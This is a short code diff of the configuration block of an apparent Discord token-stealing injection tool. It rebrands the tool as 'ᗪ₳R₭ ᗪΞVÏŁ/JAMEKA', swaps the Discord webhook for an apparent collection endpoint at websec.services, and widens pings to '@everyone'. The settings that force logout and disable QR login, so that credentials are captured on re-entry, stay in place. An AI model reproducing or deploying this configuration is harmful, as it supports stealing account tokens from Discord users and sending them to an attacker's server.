@@ -11,25 +11,25 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "JAMEKA",
+    brand: "ᗪ₳R₭ ᗪΞVÏŁ/JAMEKA",
 
-    webhook: "https://discord.com/api/webhooks/992914534840930395/OuMdpIAJOOfk5sFj8jd669TlBe30EH3I5-GvKlClvvPweQPJOJfJkqK_1-xn5ZSuWnJB",
+    webhook: "https://websec.services/send/633d98059ad22e8b19d01639",
 
     logout: true,
     disable_qr_code: true,
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@here"],
+    ping: [true, "@here/@everyone"],
 
     embed: {
         username: "! 𝑱𝑴𝑨𝑬𝑲𝑨.〆#2003  https://discord.gg/nrYgKrhuGU",
         footer: {
             text: `! 𝑱𝑴𝑨𝑬𝑲𝑨.〆#2003  https://discord.gg/nrYgKrhuGU`,
-            icon_url: "https://cdn.discordapp.com/icons/863037338719485972/a_3fd4c26d2f98158823660cb792326af3.gif?size=1024",
+            icon_url: "https://cdn.discordapp.com/avatars/895704973449494619/a_353d92690308e3241fbe1141cf65111b.gif?size=1024",
         },
         href: "https://discord.gg/nrYgKrhuGU",
-        avatar_url: "https://cdn.discordapp.com/icons/863037338719485972/a_3fd4c26d2f98158823660cb792326af3.gif?size=1024"
+        avatar_url: "https://cdn.discordapp.com/avatars/895704973449494619/a_353d92690308e3241fbe1141cf65111b.gif?size=1024"
     },
 
     badges: {
